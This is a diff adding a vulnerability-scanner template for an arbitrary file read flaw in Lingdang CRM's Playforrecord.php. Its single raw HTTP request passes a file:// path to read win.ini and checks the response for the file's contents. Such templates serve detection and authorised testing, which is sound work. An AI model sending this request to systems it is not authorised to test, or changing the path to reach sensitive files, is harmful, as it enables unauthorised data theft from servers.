@@ -1,0 +1,23 @@
+id: lingdangCRM-Playforrecord_php-File-reading
+
+info:
+  name: 灵当CRM Playforrecord.php 任意文件读取漏洞
+  author: xxx
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /crm/modules/Accounts/Playforrecord.php?download=file:///c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
